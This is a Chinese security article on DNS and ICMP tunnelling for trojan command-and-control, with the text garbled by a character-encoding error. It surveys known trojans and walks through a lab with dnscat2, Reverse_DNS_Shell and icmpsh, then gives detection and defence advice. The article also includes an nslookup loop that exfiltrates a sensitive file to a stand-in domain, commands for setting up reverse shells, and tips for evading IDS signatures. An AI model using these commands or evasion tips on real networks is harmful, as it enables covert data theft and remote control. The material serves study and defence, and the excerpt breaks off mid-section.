> éš§é“æŠ€æœ¯ä¹‹ DNS å’Œ ICMP ä¸å…¶æ£€æµ‹é˜²å¾¡
[![](https://p3.ssl.qhimg.com/t01e26b6d9b938b27de.jpg)](https://p3.ssl.qhimg.com/t01e26b6d9b938b27de.jpg)

ç®€è¿°
--

ä¸ºäº†é€ƒé¿ç›‘æµ‹ï¼Œç»•è¿‡æ€è½¯ï¼Œæ›´å¥½çš„éšè—è‡ªèº«ï¼Œå¾ˆå¤šæœ¨é©¬çš„ä¼ è¾“å±‚éƒ½ä½¿ç”¨äº†éš§é“æŠ€æœ¯, é‚£ä»€ä¹ˆæ˜¯éš§é“æŠ€æœ¯ï¼ˆæˆ‘æ˜¯è°ï¼‰ï¼Ÿå…¶ä¼ è¾“æœ‰ä»€ä¹ˆç‰¹ç‚¹ï¼ˆæˆ‘ä»å“ªé‡Œæ¥ï¼‰ï¼Ÿéš§é“æŠ€æœ¯çš„ç°çŠ¶æ˜¯æ€æ ·çš„å‘¢ï¼ˆæˆ‘åˆ°é‚£é‡Œå»ï¼‰ï¼Ÿè¿é—®ä¸‰è¿å‡»ï¼šï¼‰

**éš§é“æŠ€æœ¯ï¼ˆTunnelingï¼‰**ï¼šæ˜¯ä¸€ç§é€šè¿‡ä½¿ç”¨äº’è”ç½‘ç»œçš„åŸºç¡€è®¾æ–½åœ¨ç½‘ç»œä¹‹é—´ä¼ é€’æ•°æ®çš„æ–¹å¼ï¼Œä½¿ç”¨éš§é“ä¼ é€’çš„ Data(æ•°æ®) æˆ– Payload (è´Ÿè½½ï¼‰å¯ä»¥æ˜¯ä¸åŒåè®®çš„æ•°æ®å¸§æˆ–åŒ…ã€‚éš§é“åè®®å°†å…¶å®ƒåè®®çš„æ•°æ®å¸§æˆ–åŒ…ï¼Œé‡æ–°å°è£…ç„¶åé€šè¿‡éš§é“å‘é€ï¼Œæ–°çš„å¸§å¤´ï¼Œæä¾›è·¯ç”±ä¿¡æ¯ï¼Œä»¥ä¾¿é€šè¿‡äº’è”ç½‘ä¼ é€’è¢«å°è£…çš„ Payloadã€‚

**æ•°æ®ä¼ è¾“ç‰¹ç‚¹ï¼ˆFeatureï¼‰**ï¼šä¸é€šè¿‡ç½‘ç»œç›´æ¥å‘é€æ•°æ®åŒ…ï¼Œé€šè¿‡å°è£…æŠ€æœ¯åœ¨å¦ä¸€ä¸ª (é€šå¸¸æ˜¯åŠ å¯†çš„) è¿æ¥ä¸­å‘é€æ•°æ®ã€‚

ç°çŠ¶ï¼šä¼ ç»Ÿ socket éš§é“å·²æå°‘ï¼ŒTCPã€UDP å¤§é‡è¢«é˜²å¾¡ç³»ç»Ÿæ‹¦æˆªï¼ŒDNSã€ICMPã€http/https ç­‰éš¾äºç¦æ­¢çš„åè®®å·²æˆä¸ºé»‘å®¢æ§åˆ¶éš§é“çš„ä¸»æµã€‚

ä¸Šé¢æˆ‘ä»¬äº†è§£äº†éš§é“æŠ€æœ¯ï¼Œä¸çŸ¥ä½ æ˜¯å¦ä¼šå¥½å¥‡ DNS éš§é“ä¸ºä»€ä¹ˆä¼šæœ‰é‚£ä¹ˆå¼ºå¤§ï¼Ÿä¸€æ–¹é¢æ˜¯å› ä¸º DNS æŠ¥æ–‡å…·æœ‰å¤©ç„¶çš„ç©¿é€é˜²ç«å¢™çš„èƒ½åŠ›; å¦ä¸€æ–¹é¢, ç›®å‰çš„æ€æ¯’è½¯ä»¶ã€IDS ç­‰å®‰å…¨ç­–ç•¥å¾ˆå°‘å¯¹ DNS æŠ¥æ–‡è¿›è¡Œæœ‰æ•ˆçš„ç›‘æ§ç®¡ç†ï¼šï¼‰æ¥ä¸‹æ¥æˆ‘ä»¬æ¥å›é¡¾ä¸‹è¿™æ ·å‡ ä¸ªå…¸å‹çš„æ”»å‡»äº‹ä»¶ä¸­ç”¨åˆ°çš„éš§é“æœ¨é©¬çš„ç‰¹ç‚¹ã€‚

### ALMA Communicator From OilRig é»‘å®¢ç»„ç»‡

å®ƒä½¿ç”¨äº† DNS éš§é“æ¥ä½œä¸º C2 é€šä¿¡ä¿¡é“ï¼Œä½¿ç”¨äº†ä¸“é—¨çš„å­åŸŸåæ¥ç»™ C2 æœåŠ¡å™¨ä¼ è¾“æ•°æ®ï¼ŒæœåŠ¡å™¨ä½¿ç”¨äº†ä¸“é—¨çš„ IPv4 åœ°å€æ¥ç»™æœ¨é©¬å‘é€æ•°æ®ã€‚

[![](https://p3.ssl.qhimg.com/t017a3764b98652a8b6.png)](https://p3.ssl.qhimg.com/t017a3764b98652a8b6.png)  
æœ¨é©¬æ„é€ çš„ C2 åŸŸåç»“æ„

[![](https://p0.ssl.qhimg.com/t013365c4a25b0a83e7.png)](https://p0.ssl.qhimg.com/t013365c4a25b0a83e7.png)  
DNS æŸ¥è¯¢æ—¶çš„ç»“æ„

> Read More!!! [https://www.anquanke.com/post/id/87228](https://www.anquanke.com/post/id/87228)

### Trojan.Win32.Ismdoor.gen

è¯¥æœ¨é©¬ä½¿ç”¨ DNS éš§é“ï¼Œå¹¶å°†ä¼ å‡º â€œdatagramsâ€ï¼ˆæ•°æ®æŠ¥ï¼‰çš„é•¿åº¦è¢«é™åˆ¶åœ¨ 60 å­—ç¬¦ï¼ŒC&C æœåŠ¡å™¨çš„å‘½ä»¤è§£æåˆ° IPv6 åœ°å€ï¼Œä¸€ä¸ªå…¸å‹çš„æŸ¥è¯¢å‘é€åˆ° C&C æœåŠ¡å™¨å¦‚ä¸‹:

```
n.n.c.<Session ID >.<Serverdomain>.com
```

[![](https://p0.ssl.qhimg.com/t018404eec79d53c35c.png)](https://p0.ssl.qhimg.com/t018404eec79d53c35c.png)  
[![](https://p2.ssl.qhimg.com/t01fc7edef7c2f163bf.png)](https://p2.ssl.qhimg.com/t01fc7edef7c2f163bf.png)  
â€‹ ä¼ è¾“å±‚è¯·æ±‚å’Œå“åº”çš„ç»“æ„

> Read More!!! [http://www.4hou.com/info/news/10250.html](http://www.4hou.com/info/news/10250.html)

### XshellGhost

åœ¨å‘é€æ•°æ®åŒ…æ—¶ï¼Œä¼šå°†æ•°æ®åµŒå¥—åˆ° DNS åè®®ä¸­å‘é€ï¼Œå…¶ä¸­æ•°æ®ä¼šç¼–ç æˆç‰¹å®šçš„å­—ç¬¦ä¸²ï¼Œæ·»åŠ åœ¨è¦é…ç½®æ–‡ä»¶ä¸­çš„ CCDNS URL å‰ï¼Œå®ç° DNS éš§é“é€šè®¯ã€‚

[![](https://p5.ssl.qhimg.com/t012a30ff44f7e09390.png)](https://p5.ssl.qhimg.com/t012a30ff44f7e09390.png)  
Xshell DNS éš§é“é€šè®¯ç¼–ç   
[![](https://p2.ssl.qhimg.com/t0142815e8b0592e891.jpg)](https://p2.ssl.qhimg.com/t0142815e8b0592e891.jpg)  
Xshell DNS éš§é“é€šè®¯æºç 

> Read More!!! [http://www.4hou.com/technology/7368.html](http://www.4hou.com/technology/7368.html)

ç›¸ä¿¡æœºæ™ºçš„ä½ å·²ç»çœ‹å‡ºæ¥äº†ğŸ™‚è¿™äº› DNS éš§é“çš„æœ¨é©¬éƒ½æœ‰ä¸€ä¸ªå…±æ€§ï¼Œå®ƒä»¬çš„ DNS é€šä¿¡åè®®ï¼Œçœ‹èµ·æ¥éƒ½æ¯”è¾ƒå¥‡æ€ªï¼Œå¯¹ï¼Œå°±æ˜¯ä¸æ­£å¸¸ï¼›é‚£ä¹ˆæˆ‘ä»¬è¯¥å¦‚ä½•å»æ£€æµ‹ï¼, ç›®å‰ä¸»è¦åˆ†ä¸ºä¸¤å¤§ç±»: è½½è·åˆ†æå’Œæµé‡ç›‘æµ‹ã€‚

è½½è·åˆ†æï¼šæŠŠä¸»æœºåè¶…è¿‡ 52 ä¸ªå­—ç¬¦çš„ DNS è¯·æ±‚ä½œä¸ºè¯†åˆ« DNS éš§é“çš„ç‰¹å¾.ï¼ˆæ­£å¸¸çš„åŸŸåæ»¡è¶³ Zipf å®šå¾‹, è€Œèµ° DNS éš§é“çš„åŸŸåéµå¾ªçš„æ˜¯éšæœºåˆ†å¸ƒï¼‰

æµé‡ç›‘æµ‹ï¼šæ£€æµ‹ç½‘ç»œä¸­çš„ DNS æµé‡å˜åŒ–æƒ…å†µï¼Œé€šè¿‡æ£€æµ‹å•ä½æ—¶é—´å†… DNS æŠ¥æ–‡æµé€Ÿç‡æ¥æ£€æµ‹æ˜¯å¦å­˜åœ¨ DNS éš§é“ï¼Œåˆ©ç”¨æ£€æµ‹ txt ç±»å‹çš„ DNS æŠ¥æ–‡æ¥å‘ç°åƒµå°¸ç½‘ç»œçš„é€šä¿¡æƒ…å†µã€‚

å®éªŒç¯å¢ƒ
----

åœ¨æ¥ä¸‹æ¥çš„ç¯èŠ‚ä¸­ï¼Œæˆ‘ä¼šåˆ©ç”¨ Github ä¸Šå¸¸è§çš„å¼€æºéš§é“å·¥å…·å¦‚ dnscat2ã€Reverse_DNS_Shellã€icmpshã€icmptunnel ç­‰è¿›è¡Œå®éªŒï¼Œåˆ†æå…¶é€šä¿¡ï¼Œæå–ç›¸å…³çš„ç‰¹å¾ã€‚

```
Server: inet192.168.30.129 Debian 7.2
Client: inet 192.168.30.130Debian 7.2
Other: inet192.168.30.134 Win XP
```

### DNS éš§é“

DNS éš§é“é€šä¿¡æ˜¯ C&C å¸¸ç”¨çš„é€šä¿¡æ–¹å¼ï¼Œä¸€èˆ¬å¸¸ç”¨çš„ç¼–ç æ–¹å¼ Base64ã€Binaryã€Hex ç¼–ç ç­‰ï¼Œè¯·æ±‚çš„ Type ä¸€èˆ¬ä¸º txtï¼ˆä¸ºäº†è¿”å›çš„æ—¶å€™èƒ½å¤ŸåŠ å…¥æ›´å¤šçš„ä¿¡æ¯ï¼‰payload éƒ¨åˆ†ä¸€èˆ¬ä¸ºå­åŸŸåã€‚DNS å·¥ä½œåŸç†å¦‚ä¸‹ï¼š

[![](https://p4.ssl.qhimg.com/t01e256636acf9ac124.png)](https://p4.ssl.qhimg.com/t01e256636acf9ac124.png)

è¿™é‡Œå…ˆä»‹ç» DNS éš§é“çš„ä¸€ä¸ªåº”ç”¨åœºæ™¯ï¼š

> åœ¨å®‰å…¨ç­–ç•¥ä¸¥æ ¼çš„å†…ç½‘ç¯å¢ƒä¸­ï¼Œå¸¸è§çš„ C&C é€šè®¯ç«¯å£éƒ½è¢«ä¼—å¤šå®‰å…¨è®¾å¤‡æ‰€ç›‘æ§ã€‚å¦‚æœçº¢é˜Ÿå¯¹ç›®æ ‡å†…ç½‘çš„ç»ˆç«¯è¿›è¡Œæ¸—é€æ—¶ï¼Œå‘ç°è¯¥ç½‘æ®µåªå…è®¸ç™½åå•æµé‡å‡ºç«™ï¼ŒåŒæ—¶å…¶å®ƒç«¯å£éƒ½è¢«å±è”½æ—¶ï¼Œä¼ ç»Ÿ C&C é€šè®¯æ‰‹æ®µæ— æ³•æˆç«‹ï¼Œåå¼¹ Shell å˜å¾—ååˆ†å›°éš¾ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œçº¢é˜Ÿè¿˜æœ‰ä¸€ä¸ªæœ€åçš„é€‰æ‹©ï¼šä½¿ç”¨ DNS éšè”½éš§é“å»ºç«‹ ReverseShellã€‚

ä¸€ä¸ª Demoï¼ˆæˆ‘ä»¬å¯ä»¥ç”¨ä¸‹é¢è¿™æ ·çš„ shell:).

```
For I in (cat sensitive.txt); do d=(echoi|base64) && nslookup d.test.com; done
/**å¯¹æ¯è¡Œå†…å®¹è¿›è¡Œbase64ç¼–ç ,åœ¨DNSæŸ¥è¯¢æœŸé—´å°†å…¶ç”¨ä½œå­åŸŸï¼Œä¸€æ—¦æŸ¥è¯¢åˆ°è¾¾test.comçš„Authoritative DNSæœåŠ¡å™¨ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ•è·ç›¸åº”çš„DNSæ—¥å¿—ï¼Œé€šè¿‡è§£ææ—¥å¿—å¯ä»¥è·å¾—å­åŸŸï¼Œä»è€Œå¾—åˆ°ç›¸åº”çš„æ•æ„Ÿæ•°æ®**/
è¿™æ ·çš„ shell è‡ªç„¶å­˜åœ¨è®¸å¤šä¸è¶³çš„åœ°æ–¹
```

1ã€å•å‘é€šä¿¡ï¼Œä¸èƒ½ä» C2(Authoritative DNS) å‘å›å‘½ä»¤  
2ã€è¯»å–æ–‡ä»¶éå¸¸å®¹æ˜“ï¼Œå¦‚æœéœ€è¦å¤„ç† 100MB æ•°æ®æ—¶ DNS æ•°æ®åŒ…å¯èƒ½ä¼šä»¥ä¸åŒçš„é¡ºåºåˆ°è¾¾ã€‚  
æ ¹æ®æœ¨é©¬å·¥ä½œåŸç†çš„ä¸åŒ, å°† DNS éš§é“æœ¨é©¬ç»†åˆ†ä¸º IP ç›´è¿å‹å’ŒåŸŸåå‹ï¼Œè¿™é‡Œä¸»è¦ä»‹ç»ï¼šDnsCat2ã€Dnscat2-powershellã€Reverse_DNS_Shellã€‚

**dnscat2**

DNScat2 æ”¯æŒåŠ å¯†ï¼Œé€šè¿‡é¢„å…±äº«å¯†é’¥è¿›è¡Œèº«ä»½éªŒè¯ï¼Œå¤šä¸ªåŒæ—¶è¿›è¡Œçš„ä¼šè¯ï¼Œç±»ä¼¼äº ssh ä¸­çš„éš§é“ï¼Œå‘½ä»¤ shell ä»¥åŠæœ€æµè¡Œçš„ DNS æŸ¥è¯¢ç±»å‹ï¼ˆTXTï¼ŒMXï¼ŒCNAMEï¼ŒAï¼ŒAAAAï¼‰, å®¢æˆ·ç«¯ç”¨ C è¯­è¨€ç¼–å†™ï¼ŒæœåŠ¡å™¨ç”¨ ruby ç¼–å†™ã€‚

[![](https://p0.ssl.qhimg.com/t0155ea27f101d909dc.png)](https://p0.ssl.qhimg.com/t0155ea27f101d909dc.png)  
Dns Tuneling

å½“è¿è¡Œå®¢æˆ·ç«¯æ—¶ï¼Œéœ€è¦æŒ‡å®šä¸€ä¸ªåŸŸåï¼ˆåŸŸåå‹ DNS éš§é“æœ¨é©¬ï¼‰ï¼Œæ‰€æœ‰è¯·æ±‚éƒ½å°†å‘é€åˆ°æœ¬åœ° DNS æœåŠ¡å™¨ï¼Œç„¶åå°†è½¬å‘è‡³è¯¥åŸŸ Authoritative DNS æœåŠ¡å™¨ï¼Œå¦‚æœä½ æ²¡æœ‰ä¸€ä¸ª Authoritative DNS æœåŠ¡å™¨ï¼Œä½ ä¹Ÿå¯ä»¥é€‰æ‹© UDP çš„ 53 ç«¯å£ï¼ˆIP ç›´è¿å‹ DNS éš§é“æœ¨é©¬ï¼‰ï¼Œè¿™æ ·é€Ÿåº¦æ›´å¿«ï¼Œè€Œä¸”çœ‹èµ·æ¥ä»ç„¶åƒæ™®é€šçš„ DNS æŸ¥è¯¢ï¼Œä½†æ˜¯åœ¨è¯·æ±‚æ—¥å¿—ä¸­æ‰€æœ‰åŸŸåéƒ½æ˜¯ä»¥ dnscat å¼€å¤´ï¼Œè¿™ç§æ¨¡å¼ä¹Ÿå®¹æ˜“è¢«é˜²ç«å¢™æ£€æµ‹åˆ°ï¼ŒServer éœ€è¦åœ¨ Authoritative DNS æœåŠ¡å™¨ä¸Šè¿è¡Œï¼Œä¸ Client ç›¸åŒéœ€è¦æŒ‡å®šåŸŸå / IPã€‚

[![](https://p0.ssl.qhimg.com/t01f4ccf70c266f521d.png)](https://p0.ssl.qhimg.com/t01f4ccf70c266f521d.png)  
â€‹ åŸŸåå‹ DNS éš§é“æœ¨é©¬é€šä¿¡æ¶æ„å›¾

ä¸€ã€éƒ¨ç½²

```
#Client
$ git clonehttps://github.com/iagox86/dnscat2.git
$ cd dnscat2/client/
$ make
#Server
yum install rubygems
gem install bundler
git clonehttps://github.com/iagox86/dnscat2.git
cd dnscat2/server
bundle install
```

äºŒã€å‚æ•°ä»‹ç»  
è¯·æ³¨æ„æŠŠ dnsch.cirrus.[domain] æ¢æˆä½ è‡ªå·±çš„åŸŸåã€‚  
å‘½ä»¤è¡Œä¸­ï¼š

> -c å‚æ•°å®šä¹‰äº† pre-shared secretï¼Œå¯ä»¥ä½¿ç”¨å…·æœ‰é¢„å…±äº«å¯†é’¥çš„èº«ä»½éªŒè¯æ¥é˜²æ­¢ä¸­é—´äººï¼ˆman-in-the-middleï¼‰æ”»å‡»ï¼Œå¦åˆ™ä¼ è¾“æ•°æ®å¹¶æœªåŠ å¯†ï¼Œæœ‰å¯èƒ½è¢«ç›‘å¬ç½‘ç»œæµé‡çš„ç¬¬ä¸‰æ–¹è¿˜åŸï¼›å¦‚æœä¸åŠ å®šä¹‰ï¼ŒDnscat2 ä¼šç”Ÿæˆä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œè®°å¾—æ‹·è´ä¸‹æ¥åœ¨å¯åŠ¨å®¢æˆ·ç«¯æ—¶ä½¿ç”¨ã€‚
> 
> -e å‚æ•°å¯ä»¥è§„å®šå®‰å…¨çº§åˆ«ï¼Œ open ä»£è¡¨è®©å®¢æˆ·ç«¯è¿›è¡Œé€‰æ‹©ã€‚
> 
> â€”no-cache è¯·åŠ¡å¿…åœ¨è¿è¡ŒæœåŠ¡å™¨æ—¶æ·»åŠ æ— ç¼“å­˜é€‰é¡¹ï¼Œå› ä¸º powershell-dnscat2 å®¢æˆ·ç«¯ä¸ dnscat2 æœåŠ¡å™¨çš„ caching æ¨¡å¼ä¸å…¼å®¹ã€‚

ä¸‰ã€Usage  
å¦‚æœç›®æ ‡å†…ç½‘æ”¾è¡Œäº†æ‰€æœ‰çš„ DNS è¯·æ±‚ï¼Œé‚£ä¹ˆå°±å¯ä»¥ç›´æ¥æŒ‡å®š HOST ï¼Œé€šè¿‡ UDP53 ç«¯å£é€šä¿¡ï¼Œè€Œå¦‚æœç›®æ ‡å†…ç½‘åªå…è®¸å’Œå—ä¿¡ä»»çš„ DNS æœåŠ¡å™¨é€šä¿¡æ—¶å°±éœ€è¦ç”³è¯·æ³¨æ„åŸŸåï¼Œå¹¶å°†è¿è¡Œ dnscat2 server çš„æœåŠ¡å™¨æŒ‡å®š Authoritative DNS æœåŠ¡å™¨ï¼Œè¿™é‡Œæˆ‘ä»¬ä»¥ç¬¬ä¸€ç§æƒ…å†µä¸ºä¾‹ã€‚  
å››ã€ç»†èŠ‚å¦‚ä¸‹  
1ï¼‰Server

```
ruby ./dnscat2.rb
```

[![](https://p5.ssl.qhimg.com/t013c4d8a49008b4b7e.png)](https://p5.ssl.qhimg.com/t013c4d8a49008b4b7e.png)  
2ï¼‰Client

```
./dnscat --dns server=192.168.30.129,port=53 --secret=a152c1cc946358825617f5cbcd3dce44
```

[![](https://p3.ssl.qhimg.com/t01fc95d5b630092ca2.png)](https://p3.ssl.qhimg.com/t01fc95d5b630092ca2.png)

3ï¼‰Server å¯ä»¥çœ‹åˆ°è¿æ¥å»ºç«‹

[![](https://p2.ssl.qhimg.com/t01983e5007267e8b7a.png)](https://p2.ssl.qhimg.com/t01983e5007267e8b7a.png)

4ï¼‰é€šä¿¡æ•°æ®åŒ…ç‰¹å¾

[![](https://p0.ssl.qhimg.com/t019905259051eae0e8.png)](https://p0.ssl.qhimg.com/t019905259051eae0e8.png)

äº”ã€æ£€æµ‹ä¸é˜²å¾¡

æ£€æµ‹ï¼š  
1ã€ä¸Šæ–‡æåˆ°é»˜è®¤çš„ dnscat æŸ¥è¯¢ä¸­åŒ…å«äº† dnscat å­—ç¬¦ä¸²ï¼Œè¿™ä¸ªå¯ä»¥ä½œä¸ºé˜²ç«å¢™å’Œå…¥ä¾µæ£€æµ‹çš„ç‰¹å¾  
2ã€æ£€æŸ¥å‡ºç«™ DNS æŸ¥è¯¢çš„æŸ¥è¯¢é•¿åº¦ï¼Œç›‘è§†æ¥è‡ªç‰¹å®šä¸»æœºçš„ DNS æŸ¥è¯¢çš„é¢‘ç‡ï¼Œä»¥åŠæ£€æŸ¥ç‰¹å®šçš„ä¸å¸¸è§æŸ¥è¯¢ç±»å‹æ˜¯ä¸€äº›ç¤ºä¾‹ã€‚  
3ã€è®°å½• DNS æŸ¥è¯¢æ—¥å¿—ï¼Œé€šè¿‡é¢‘ç‡ã€é•¿åº¦ã€ç±»å‹ç›‘æ§å¼‚å¸¸æ—¥å¿—  
é˜²å¾¡ï¼šé˜²ç«å¢™ä¸Šé™åˆ¶åªå…è®¸ä¸å—ä¿¡ä»»çš„ DNS æœåŠ¡å™¨é€šä¿¡

**dnscat2-powershell**

> [https://github.com/lukebaggett/dnscat2-powershell](https://github.com/lukebaggett/dnscat2-powershell)

[![](https://p2.ssl.qhimg.com/t0152302e59a972347d.png)](https://p2.ssl.qhimg.com/t0152302e59a972347d.png)

Dnscat2-powershell å¯é€šè¿‡é€šç”¨ç­¾åé¿å…æ£€æµ‹:

*   1ã€å¯ä»¥åœ¨å®¢æˆ·ç«¯ä½¿ç”¨ â€“Delay å’Œâ€“MaxRandomDelay ä¸ Start-Dnscat2 å‘é€çš„æ¯ä¸ªè¯·æ±‚ä¹‹é—´æ·»åŠ é™æ€æˆ–éšæœºå»¶è¿Ÿï¼›å¯ä»¥ä½¿ç”¨æŸ¥è¯¢çš„ç²¾ç¡®æœ€å¤§é•¿åº¦åŸºäºæŸ¥è¯¢æ¥ç¼–å†™ç­¾åã€‚å¦‚æœæ‚¨æƒ³è¦ç¨å¾®éšè”½ä¸€äº›ï¼Œå¯ä»¥ä½¿ç”¨ - MaxPacketSize å‚æ•°ç¼©çŸ­æœ€å¤§è¯·æ±‚å¤§å°ã€‚
*   2ã€è®¸å¤š DNS éš§é“å°†ä½¿ç”¨ TXTï¼ŒCNAME æˆ– MX æŸ¥è¯¢ï¼Œå› ä¸ºå®ƒä»¬çš„å“åº”å¤„ç†ç®€å•ï¼Œå“åº”æ—¶é—´é•¿ã€‚è¿™äº›ä¸æ˜¯æœ€å¸¸è§çš„æŸ¥è¯¢ç±»å‹ï¼Œå› æ­¤ IDS å¯èƒ½ä¼šè­¦å‘Šè¿™äº›æŸ¥è¯¢çš„é¢‘ç‡å¾ˆé«˜ã€‚æ•…è€Œå¯ä»¥æ„é€ åŸºäºï¼šA å’Œ AAAA æŸ¥è¯¢ï¼ˆ Start-Dnscat2 çš„ - LookupTypes å‚æ•°å¯ç”¨äºå°†æœ‰æ•ˆæŸ¥è¯¢ç±»å‹åˆ—è¡¨ä¼ é€’ç»™å®¢æˆ·ç«¯ï¼‰

ä»¥ä¸‹æä¾›æ„é€ é¿å…æ£€æµ‹åŠæé«˜ä¼ è¾“é€Ÿåº¦çš„ä¸€ä¸ªæ¼”ç¤ºè§†é¢‘ï¼Œè‹¥æ— æ³•æ‰“å¼€ï¼Œå¯è§æ–‡æœ«ä¸‹è½½é“¾æ¥

> [https://www.youtube.com/watch?v=VrA8cyrssos](https://www.youtube.com/watch?v=VrA8cyrssos)

**Reverse_DNS_Shell**

ä½¿ç”¨ DNS ä½œä¸º C2 é€šé“çš„ Python åå‘ Shellã€‚

> [https://github.com/ahhh/Reverse_DNS_Shell](https://github.com/ahhh/Reverse_DNS_Shell)

ä¸€ã€è¦æ±‚

*   dnslib
*   dnspython
*   pycrypto

KaliLinux é»˜è®¤ python ç¯å¢ƒä¸º 2.7 ä»¥ä¸Šï¼ˆé»˜è®¤å·²å®‰è£…å¥½ï¼‰ï¼Œä»¥ä¸Šä¸‰ä¸ªåŒ…éœ€è¦ä½¿ç”¨ pip è¿›è¡Œå®‰è£…ã€‚

äºŒã€æ³¨æ„

*   é¦–å…ˆè¿è¡ŒæœåŠ¡ç«¯è„šæœ¬
*   ä¸è¦å¿˜è®°æ›´æ”¹æ‚¨çš„ç§˜å¯†å¯†é’¥ï¼ˆå¯åœ¨ä»£ç é‡Œé¢æ”¹ï¼‰

ä¸‰ã€åŸç†è§£æ

> [http://lockboxx.blogspot.com/2015/01/python-reverse-dns-shell.html](http://lockboxx.blogspot.com/2015/01/python-reverse-dns-shell.html)

å››ã€ç»†èŠ‚

1ï¼‰ Server ç«¯æœåŠ¡å™¨ç›‘å¬çŠ¶æ€

[![](https://p3.ssl.qhimg.com/t01c7fa0fb7869cfb1c.png)](https://p3.ssl.qhimg.com/t01c7fa0fb7869cfb1c.png)

2) Client ç«¯è¯·æ±‚çŠ¶æ€

[![](https://p4.ssl.qhimg.com/t01392e67b7a63370ad.png)](https://p4.ssl.qhimg.com/t01392e67b7a63370ad.png)

3) æˆåŠŸåå¼¹ Shell

[![](https://p3.ssl.qhimg.com/t0195ce8f5c0051c4d3.png)](https://p3.ssl.qhimg.com/t0195ce8f5c0051c4d3.png)

äº”ã€åˆ©ç”¨ tcpdump è¿›è¡Œæ•°æ®åŒ…æŠ“å–  
æŠ“å–ä¸»æœºï¼š192.168.30.129 ä¸ 192.168.30.130 çš„é€šä¿¡æ•°æ®åŒ…ï¼Œä¿å­˜ä¸º root ç›®å½•ä¸‹ DNSShell.cap

```
tcpdump -n -i eth0 host 192.168.30.129and 192.168.30.130 -w /root/DNSShell.cap
```

[![](https://p4.ssl.qhimg.com/t0109402abf4766c4fa.png)](https://p4.ssl.qhimg.com/t0109402abf4766c4fa.png)

æ•°æ®åŒ…è§£ææƒ…å†µ

[![](https://p3.ssl.qhimg.com/t0168b168911562d618.png)](https://p3.ssl.qhimg.com/t0168b168911562d618.png)

### ICMP éš§é“

å°† IP æµé‡å°è£…è¿› IMCP çš„ ping æ•°æ®åŒ…ä¸­ï¼Œæ—¨åœ¨åˆ©ç”¨ ping ç©¿é€é˜²ç«å¢™çš„æ£€æµ‹ï¼Œå› ä¸ºé€šå¸¸é˜²ç«å¢™æ˜¯ä¸ä¼šå±è”½ ping æ•°æ®åŒ…ã€‚  
åŸç†è§£æï¼š

> è¯·æ±‚ç«¯çš„ Ping å·¥å…·é€šå¸¸ä¼šåœ¨ ICMP æ•°æ®åŒ…åé¢é™„åŠ ä¸Šä¸€æ®µéšæœºçš„æ•°æ®ä½œä¸º Payloadï¼Œè€Œå“åº”ç«¯åˆ™ä¼šæ‹·è´è¿™æ®µ Payload åˆ° ICMP å“åº”æ•°æ®åŒ…ä¸­è¿”è¿˜ç»™è¯·æ±‚ç«¯ï¼Œç”¨äºè¯†åˆ«å’ŒåŒ¹é… Ping è¯·æ±‚ï¼ˆWindows å’Œ Linux ç³»ç»Ÿä¸‹çš„ Ping å·¥å…·é»˜è®¤çš„ Payload é•¿åº¦ä¸º 64bitï¼Œä½†å®é™…ä¸Šåè®®å…è®¸é™„åŠ æœ€å¤§ 64K å¤§å°çš„ Payloadï¼‰

æœ€åä¸€ä¸ª Payload å­—æ®µæ˜¯å¯ä»¥å­˜æ”¾ä»»ä½•æ•°æ®çš„ï¼Œé•¿åº¦çš„è¯ ç†è®ºä¸Š ICMP åŒ…å¤–çš„ IP åŒ…é•¿åº¦ä¸è¶…è¿‡ MTU å³å¯ï¼Œä½†æ˜¯å®é™…ä¸Šä¼ ä¸äº†é‚£ä¹ˆå¤§ã€‚

[![](https://p3.ssl.qhimg.com/t019a188cc6333ff518.png)](https://p3.ssl.qhimg.com/t019a188cc6333ff518.png)  
â€‹ ICMP echo-request header

**ptunnel**

ä¸€ä¸ªéš§é“å·¥å…·ï¼Œå…è®¸æ‚¨é€šè¿‡å¯é çš„ TCP éš§é“è¿æ¥ä¸€ä¸ªè¿œç¨‹ä¸»æœºï¼Œå¹¶ä½¿ç”¨ ICMP å›é€è¯·æ±‚å’Œåº”ç­”åŒ…ï¼Œä¿—ç§° ping è¯·æ±‚å’Œå›å¤ã€‚

> [http://freshmeat.sourceforge.net/projects/ptunnel/](http://freshmeat.sourceforge.net/projects/ptunnel/)

ä½¿ç”¨åœºæ™¯ç®€ä»‹ï¼š

> ä¸¤å°æœºå™¨é—´, é™¤äº†å…è®¸ç›¸äº’ ping å³ icmp é€šä¿¡, å…¶ä»–çš„ tcp/udp ç«¯å£ä¸€å¾‹ä¸å…è®¸, æ­¤æ—¶æˆ‘ä»¬å°±å¯è€ƒè™‘åˆ©ç”¨ icmp éš§é“è¿›è¡Œç©¿é€ã€‚

è¿™é‡Œå¼•ç”¨ï¼š Kionsec çš„ã€Šåˆ©ç”¨ icmp éš§é“è½»æ¾ç©¿é€ tcp/udp å››å±‚å°é”ã€‹

> [https://klionsec.github.io/2017/10/31/icmp-tunnel/](https://klionsec.github.io/2017/10/31/icmp-tunnel/)

æµç¨‹å¦‚ä¸‹

[![](https://p5.ssl.qhimg.com/t01900832aa21d04eb6.png)](https://p5.ssl.qhimg.com/t01900832aa21d04eb6.png)

**icmpsh**

icmpsh æ˜¯ä¸€ä¸ªç®€å•çš„åå‘ ICMPshell ï¼Œä¸å…¶ä»–ç±»ä¼¼çš„å¼€æºå·¥å…·ç›¸æ¯”ï¼Œå…¶ä¸»è¦ä¼˜åŠ¿åœ¨äºå®ƒä¸éœ€è¦ç®¡ç†æƒé™å³å¯åœ¨ç›®æ ‡è®¡ç®—æœºä¸Šè¿è¡Œã€‚

> [https://github.com/inquisb/icmpsh](https://github.com/inquisb/icmpsh)

ä¸€ã€Usage

1ï¼‰Server

ç¦ç”¨ ICMP

> sysctl -wnet.ipv4.icmp_echo_ignore_all=1

[![](https://p0.ssl.qhimg.com/t01597e5a7bf8d476ae.png)](https://p0.ssl.qhimg.com/t01597e5a7bf8d476ae.png)

è®¾ç½®ç›‘å¬ python icmpsh_m.pysrc(hostï¼šæœ¬åœ°æœºå™¨) dst(hostï¼šç›®æ ‡æœºå™¨)

> ./icmpsh_m.py 192.168.30.130 192.168.30.134

[![](https://p5.ssl.qhimg.com/t019922227556cc3c0e.png)](https://p5.ssl.qhimg.com/t019922227556cc3c0e.png)

åå¼¹ä¸Šçº¿

[![](https://p2.ssl.qhimg.com/t014d74fbeabd22e99f.png)](https://p2.ssl.qhimg.com/t014d74fbeabd22e99f.png)

2) Client  
